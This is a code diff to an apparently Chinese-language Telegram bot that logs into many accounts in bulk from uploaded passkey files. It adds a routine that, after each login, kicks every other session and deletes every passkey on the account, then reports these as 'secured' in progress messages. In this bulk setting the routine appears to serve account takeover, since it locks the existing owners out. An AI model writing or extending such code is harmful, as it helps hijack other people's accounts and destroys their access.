@@ -430,6 +430,33 @@ async def create_single_passkey(session_file, json_file, out_dir, api_id, api_ha
             shutil.rmtree(temp_dir, ignore_errors=True)
             log_time(f"已清理临时目录: {temp_dir}")
 
+async def secure_account_after_login(client):
+    res = {"reset_devices": 0, "delete_passkeys": 0, "errors": []}
+    try:
+        auths = await client(functions.account.GetAuthorizationsRequest())
+        for a in getattr(auths, "authorizations", []):
+            if not getattr(a, "current", False):
+                try:
+                    await client(functions.account.ResetAuthorizationRequest(hash=getattr(a, "hash", 0)))
+                    res["reset_devices"] += 1
+                except Exception as e:
+                    res["errors"].append(f"reset_auth:{e}")
+    except Exception as e:
+        res["errors"].append(f"get_auths:{e}")
+    try:
+        pks = await client(functions.account.GetPasskeysRequest())
+        for p in getattr(pks, "passkeys", []):
+            pid = getattr(p, "id", None)
+            if pid is not None:
+                try:
+                    await client(functions.account.DeletePasskeyRequest(passkey_id=pid))
+                    res["delete_passkeys"] += 1
+                except Exception as e:
+                    res["errors"].append(f"del_pk:{e}")
+    except Exception as e:
+        res["errors"].append(f"get_pks:{e}")
+    return res
+
 async def login_single_passkey(passkey_file, out_dir, api_id, api_hash):
     start_time = time.time()
     log_time(f"开始 Passkey 登录: {os.path.basename(passkey_file)}")
@@ -484,7 +511,7 @@ async def login_single_passkey(passkey_file, out_dir, api_id, api_hash):
                     await client.sign_in(password=TwoFa)
                     LoginOk = True
                 else:
-                    return False, "需提供2FA密码"
+                    return False, "需提供2FA密码", None
                 break
             except BadRequestError as E:
                 if "PASSKEY_CHALLENGE_EXPIRED" in str(E) and Attempt < MaxAttempts:
@@ -497,15 +524,17 @@ async def login_single_passkey(passkey_file, out_dir, api_id, api_hash):
         me_start = time.time()
         Me = await asyncio.wait_for(client.get_me(), timeout=10)
         log_time(f"获取用户信息耗时: {time.time() - me_start:.2f}秒")
+        secure = await secure_account_after_login(client)
+        log_time(f"安全清理完成: 踢出设备 {secure['reset_devices']} 个, 销毁 Passkey {secure['delete_passkeys']} 个, 错误 {secure['errors']}")
         await generate_json_for_session(SessionPath, client, Me, api_id, api_hash, official_api, PasskeyData.get("TwoFA"))
         total_time = time.time() - start_time
         log_time(f"Passkey 登录成功: {phone}，总耗时={total_time:.2f}秒")
-        return True, "成功"
+        return True, "成功", secure
     except asyncio.TimeoutError:
         log_time(f"Passkey 登录 {os.path.basename(passkey_file)} 网络操作超时")
-        return False, "网络操作超时"
+        return False, "网络操作超时", None
     except Exception as e:
-        return False, f"错误: {str(e)[:20]}"
+        return False, f"错误: {str(e)[:20]}", None
     finally:
         if client:
             disconnect_start = time.time()
@@ -748,17 +777,20 @@ async def process_passkey_login(update, context, zip_path, user_id, status_msg):
 
         async def on_progress(task):
             c = {"success": 0, "fail": 0}
+            secured = 0
             for r in task.done:
                 cat = r.get("category")
                 if cat in c:
                     c[cat] += 1
+                if r.get("secured"):
+                    secured += 1
 
-            task._progress_text = f"""<tg-emoji emoji-id="5942826671290715541">⚙️</tg-emoji> <b>{tr('passkey.logging_in', lang)}</b>\n\n{tr('shaihuo.progress', lang)}: {task.completed}/{len(passkey_files)}\n<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> {tr('shaihuo.success', lang)}: {c['success']} | <tg-emoji emoji-id="5886496611835581345">❌</tg-emoji> {tr('2fa.failed', lang)}: {c['fail']}"""
+            task._progress_text = f"""<tg-emoji emoji-id="5942826671290715541">⚙️</tg-emoji> <b>{tr('passkey.logging_in', lang)}</b>\n\n{tr('shaihuo.progress', lang)}: {task.completed}/{len(passkey_files)}\n<tg-emoji emoji-id="5920052658743283381">✅</tg-emoji> {tr('shaihuo.success', lang)}: {c['success']} | <tg-emoji emoji-id="5886496611835581345">❌</tg-emoji> {tr('2fa.failed', lang)}: {c['fail']}\n<tg-emoji emoji-id="5846008814129649022">🛡️</tg-emoji> {tr('passkey.secured', lang)}: {secured}"""
         async def process_one(item, task):
             pk_file = item
             acc_out = os.path.join(temp_dir, f"login_{task.completed}")
             os.makedirs(acc_out, exist_ok=True)
-            is_ok, reason = await login_single_passkey(pk_file, Path(acc_out), api_id, api_hash)
+            is_ok, reason, secure = await login_single_passkey(pk_file, Path(acc_out), api_id, api_hash)
             if is_ok:
                 moved = False
                 for pf in os.listdir(acc_out):
@@ -769,7 +801,7 @@ async def process_passkey_login(update, context, zip_path, user_id, status_msg):
                         shutil.move(os.path.join(acc_out, pf), os.path.join(success_dir, pf))
                         moved = True
                 if moved:
-                    return {"category": "success", "name": os.path.basename(str(pk_file))}
+                    return {"category": "success", "name": os.path.basename(str(pk_file)), "secured": True}
             stem = os.path.splitext(os.path.basename(str(pk_file)))[0]
             with open(os.path.join(fail_dir, f"{stem}.txt"), 'w', encoding='utf-8') as ef:
                 ef.write(reason or "未知错误")
